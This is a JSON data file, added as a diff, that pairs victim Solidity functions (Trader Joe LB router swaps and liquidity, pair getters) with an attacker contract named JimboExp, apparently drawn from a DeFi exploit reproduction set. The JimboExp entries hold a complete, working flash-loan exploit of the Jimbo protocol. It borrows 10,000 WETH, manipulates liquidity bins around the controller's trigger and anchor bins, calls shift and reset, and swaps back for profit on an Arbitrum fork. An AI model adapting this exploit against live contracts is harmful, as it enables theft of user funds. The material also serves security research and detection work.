@@ -1,0 +1,184 @@
+[
+  {
+    "contract/interface": "ILBRouter",
+    "source_type": "victim_contract",
+    "function_name": "addLiquidity",
+    "original_code": "    function addLiquidity(LiquidityParameters calldata liquidityParameters)\n        external\n        override\n        returns (\n            uint256 amountXAdded,\n            uint256 amountYAdded,\n            uint256 amountXLeft,\n            uint256 amountYLeft,\n            uint256[] memory depositIds,\n            uint256[] memory liquidityMinted\n        )\n    {\n        ILBPair lbPair = ILBPair(\n            _getLBPairInformation(\n                liquidityParameters.tokenX, liquidityParameters.tokenY, liquidityParameters.binStep, Version.V2_1\n            )\n        );\n        if (liquidityParameters.tokenX != lbPair.getTokenX()) revert LBRouter__WrongTokenOrder();\n\n        liquidityParameters.tokenX.safeTransferFrom(msg.sender, address(lbPair), liquidityParameters.amountX);\n        liquidityParameters.tokenY.safeTransferFrom(msg.sender, address(lbPair), liquidityParameters.amountY);\n\n        (amountXAdded, amountYAdded, amountXLeft, amountYLeft, depositIds, liquidityMinted) =\n            _addLiquidity(liquidityParameters, lbPair);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ILBRouter",
+    "source_type": "victim_contract",
+    "function_name": "swapExactNATIVEForTokens",
+    "original_code": "    function swapExactNATIVEForTokens(uint256 amountOutMin, Path memory path, address to, uint256 deadline)\n        external\n        payable\n        override\n        ensure(deadline)\n        verifyPathValidity(path)\n        returns (uint256 amountOut)\n    {\n        if (path.tokenPath[0] != IERC20(_wnative)) revert LBRouter__InvalidTokenPath(address(path.tokenPath[0]));\n\n        address[] memory pairs = _getPairs(path.pairBinSteps, path.versions, path.tokenPath);\n\n        _wnativeDepositAndTransfer(pairs[0], msg.value);\n\n        amountOut = _swapExactTokensForTokens(msg.value, pairs, path.versions, path.tokenPath, to);\n\n        if (amountOutMin > amountOut) revert LBRouter__InsufficientAmountOut(amountOutMin, amountOut);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ILBRouter",
+    "source_type": "victim_contract",
+    "function_name": "swapExactTokensForNATIVE",
+    "original_code": "    function swapExactTokensForNATIVE(\n        uint256 amountIn,\n        uint256 amountOutMinNATIVE,\n        Path memory path,\n        address payable to,\n        uint256 deadline\n    ) external override ensure(deadline) verifyPathValidity(path) returns (uint256 amountOut) {\n        if (path.tokenPath[path.pairBinSteps.length] != IERC20(_wnative)) {\n            revert LBRouter__InvalidTokenPath(address(path.tokenPath[path.pairBinSteps.length]));\n        }\n\n        address[] memory pairs = _getPairs(path.pairBinSteps, path.versions, path.tokenPath);\n\n        path.tokenPath[0].safeTransferFrom(msg.sender, pairs[0], amountIn);\n\n        amountOut = _swapExactTokensForTokens(amountIn, pairs, path.versions, path.tokenPath, address(this));\n\n        if (amountOutMinNATIVE > amountOut) revert LBRouter__InsufficientAmountOut(amountOutMinNATIVE, amountOut);\n\n        _wnative.withdraw(amountOut);\n        _safeTransferNATIVE(to, amountOut);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ILBRouter",
+    "source_type": "victim_contract",
+    "function_name": "swapNATIVEForExactTokens",
+    "original_code": "    function swapNATIVEForExactTokens(uint256 amountOut, Path memory path, address to, uint256 deadline)\n        external\n        payable\n        override\n        ensure(deadline)\n        verifyPathValidity(path)\n        returns (uint256[] memory amountsIn)\n    {\n        if (path.tokenPath[0] != IERC20(_wnative)) revert LBRouter__InvalidTokenPath(address(path.tokenPath[0]));\n\n        address[] memory pairs = _getPairs(path.pairBinSteps, path.versions, path.tokenPath);\n        amountsIn = _getAmountsIn(path.versions, pairs, path.tokenPath, amountOut);\n\n        if (amountsIn[0] > msg.value) revert LBRouter__MaxAmountInExceeded(msg.value, amountsIn[0]);\n\n        _wnativeDepositAndTransfer(pairs[0], amountsIn[0]);\n\n        uint256 amountOutReal = _swapTokensForExactTokens(pairs, path.versions, path.tokenPath, amountsIn, to);\n\n        if (amountOutReal < amountOut) revert LBRouter__InsufficientAmountOut(amountOut, amountOutReal);\n\n        if (msg.value > amountsIn[0]) _safeTransferNATIVE(msg.sender, msg.value - amountsIn[0]);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ILBRouter",
+    "source_type": "victim_contract",
+    "function_name": "swapTokensForExactNATIVE",
+    "original_code": "    function swapTokensForExactNATIVE(\n        uint256 amountNATIVEOut,\n        uint256 amountInMax,\n        Path memory path,\n        address payable to,\n        uint256 deadline\n    ) external override ensure(deadline) verifyPathValidity(path) returns (uint256[] memory amountsIn) {\n        if (path.tokenPath[path.pairBinSteps.length] != IERC20(_wnative)) {\n            revert LBRouter__InvalidTokenPath(address(path.tokenPath[path.pairBinSteps.length]));\n        }\n\n        address[] memory pairs = _getPairs(path.pairBinSteps, path.versions, path.tokenPath);\n        amountsIn = _getAmountsIn(path.versions, pairs, path.tokenPath, amountNATIVEOut);\n\n        if (amountsIn[0] > amountInMax) revert LBRouter__MaxAmountInExceeded(amountInMax, amountsIn[0]);\n\n        path.tokenPath[0].safeTransferFrom(msg.sender, pairs[0], amountsIn[0]);\n\n        uint256 _amountOutReal =\n            _swapTokensForExactTokens(pairs, path.versions, path.tokenPath, amountsIn, address(this));\n\n        if (_amountOutReal < amountNATIVEOut) revert LBRouter__InsufficientAmountOut(amountNATIVEOut, _amountOutReal);\n\n        _wnative.withdraw(_amountOutReal);\n        _safeTransferNATIVE(to, _amountOutReal);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JimboExp",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "JimboExp",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JimboExp",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JimboExp",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JimboExp",
+    "source_type": "attacker_contract",
+    "function_name": "executeOperation",
+    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        weth.approve(address(router), type(uint256).max);\n        Jimbo.approve(address(router), type(uint256).max);\n        weth.withdraw(10_000 ether);\n\n        // Step1: add Liquidity to a high bin\n        uint256[] memory steps = new uint256[](1);\n        ILBRouter.Version[] memory version = new ILBRouter.Version[](1);\n        IERC20[] memory tokenPath = new IERC20[](2);\n\n        steps[0] = 100;\n        version[0] = ILBRouter.Version.V2_1;\n        tokenPath[0] = IERC20(address(weth));\n        tokenPath[1] = Jimbo;\n\n        ILBRouter.Path memory path = ILBRouter.Path(steps, version, tokenPath);\n        router.swapNATIVEForExactTokens{value: 10 ether}(1 ether, path, address(this), block.timestamp + 100);\n\n        uint24 activeId = pair.getActiveId();\n        uint256 amount1 = Jimbo.balanceOf(address(this));\n\n        int256[] memory deltaIds = new int256[](1);\n        uint256[] memory distributionX = new uint256[](1);\n        uint256[] memory distributionY = new uint256[](1);\n\n        deltaIds[0] = int256(uint256(uint24((1 << 23) - 1) - activeId));\n        distributionX[0] = 1e18;\n        distributionY[0] = 0;\n\n        ILBRouter.LiquidityParameters memory parameter1 = ILBRouter.LiquidityParameters(\n            Jimbo,\n            IERC20(address(weth)),\n            100,\n            amount1,\n            0,\n            0,\n            0,\n            activeId,\n            0,\n            deltaIds,\n            distributionX,\n            distributionY,\n            address(this),\n            address(this),\n            block.timestamp + 100\n        );\n\n        router.addLiquidity(parameter1);\n\n        // Step2: trigger the `triggerBin`\n        activeId = pair.getActiveId();\n        uint24 triggerBin = controller.triggerBin();\n        uint256 amountOut = 0;\n        for (uint24 i = activeId; i <= triggerBin; ++i) {\n            (uint128 binReserveX, uint128 binReserveY) = pair.getBin(i);\n            amountOut += binReserveX;\n            //if (i == triggerBin) amountOut += (binReserveX / 10);\n        }\n\n        router.swapNATIVEForExactTokens{value: address(this).balance}(\n            amountOut + 1, path, address(this), block.timestamp + 100\n        );\n        activeId = pair.getActiveId();\n        triggerBin = controller.triggerBin();\n        require(activeId > triggerBin, \"not above triggerBin\");\n\n        // Step3: shift\n        controller.shift();\n\n        // Step4: buy All normal Jimbo\n        amountOut = 0;\n        for (uint24 j = 0; j <= 50; ++j) {\n            (uint128 binReserveX, uint128 binReserveY) = pair.getBin(j + activeId);\n            amountOut += binReserveX;\n        }\n        // (uint128 binReserveX,) = pair.getBin(activeId1 + 896);\n        // amountOut += uint256(binReserveX / 2);\n        router.swapNATIVEForExactTokens{value: address(this).balance}(\n            amountOut + 1, path, address(this), block.timestamp + 100\n        );\n\n        require(pair.getActiveId() == 8_388_607, \"wrong\");\n\n        // Step5: shift back\n        Jimbo.transfer(address(controller), 100);\n        controller.shift();\n\n        uint24 anchorBin = controller.anchorBin();\n\n        path.tokenPath[1] = path.tokenPath[0];\n        path.tokenPath[0] = Jimbo;\n\n        while (pair.getActiveId() >= anchorBin) {\n            amountOut = 0;\n            for (uint24 j = pair.getActiveId(); j >= anchorBin; --j) {\n                (, uint128 binReserveY) = pair.getBin(j);\n                amountOut += binReserveY;\n            }\n            (uint256 amountIn,,) = pair.getSwapIn(uint128(amountOut), true);\n            router.swapExactTokensForNATIVE(amountIn + 1, 0, path, payable(this), block.timestamp + 100);\n        }\n\n        require(pair.getActiveId() < anchorBin, \"wrong2\");\n\n        // Step6 reset to be plain\n        controller.reset();\n\n        // Step7: buy to High again\n        activeId = pair.getActiveId();\n        amountOut = 0;\n        for (uint24 j = 0; j <= 50; ++j) {\n            (uint128 binReserveX, uint128 binReserveY) = pair.getBin(j + activeId);\n            amountOut += binReserveX;\n        }\n        path.tokenPath[0] = path.tokenPath[1];\n        path.tokenPath[1] = Jimbo;\n\n        router.swapNATIVEForExactTokens{value: address(this).balance}(\n            amountOut + 1, path, address(this), block.timestamp + 100\n        );\n\n        // Step8: shift back\n        Jimbo.transfer(address(controller), 100);\n        controller.shift();\n\n        // Step9: swap back\n        path.tokenPath[1] = path.tokenPath[0];\n        path.tokenPath[0] = Jimbo;\n\n        router.swapExactTokensForNATIVE(Jimbo.balanceOf(address(this)), 0, path, payable(this), block.timestamp + 100);\n\n        // end\n        weth.deposit{value: address(this).balance}();\n\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JimboExp",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JimboExp",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"arbitrum\", 95_144_404);\n        deal(address(this), 0);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JimboExp",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JimboExp",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JimboExp",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JimboExp",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JimboExp",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JimboExp",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "JimboExp",
+    "source_type": "attacker_contract",
+    "function_name": "testExp",
+    "original_code": "    function testExp() external {\n        emit log_named_decimal_uint(\"[Start] Attacker WETH Balance\", weth.balanceOf(address(this)), 18);\n\n        weth.approve(address(pool), type(uint256).max);\n\n        address[] memory assets = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        uint256[] memory modes = new uint256[](1);\n\n        assets[0] = address(weth);\n        amounts[0] = 10_000 ether;\n        modes[0] = 0;\n\n        pool.flashLoan(address(this), assets, amounts, modes, address(0), abi.encodePacked(uint16(0x3230)), 0);\n\n        emit log_named_decimal_uint(\"[End] Attacker WETH Balance\", weth.balanceOf(address(this)), 18);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ILBPair",
+    "source_type": "victim_contract",
+    "function_name": "getActiveId",
+    "original_code": "    function getActiveId(bytes32 params) internal pure returns (uint24 activeId) {\n        activeId = params.decodeUint24(OFFSET_ACTIVE_ID);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ILBPair",
+    "source_type": "victim_contract",
+    "function_name": "getBin",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ILBPair",
+    "source_type": "victim_contract",
+    "function_name": "getSwapIn",
+    "original_code": "    function getSwapIn(ILBPair pair, uint128 amountOut, bool swapForY)\n        public\n        view\n        override\n        returns (uint128 amountIn, uint128 amountOutLeft, uint128 fee)\n    {\n        (amountIn, amountOutLeft, fee) = pair.getSwapIn(amountOut, swapForY);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IJimboController",
+    "source_type": "victim_contract",
+    "function_name": "anchorBin",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IJimboController",
+    "source_type": "victim_contract",
+    "function_name": "reset",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IJimboController",
+    "source_type": "victim_contract",
+    "function_name": "shift",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IJimboController",
+    "source_type": "victim_contract",
+    "function_name": "triggerBin",
+    "original_code": "",
+    "description": ""
+  }
+]
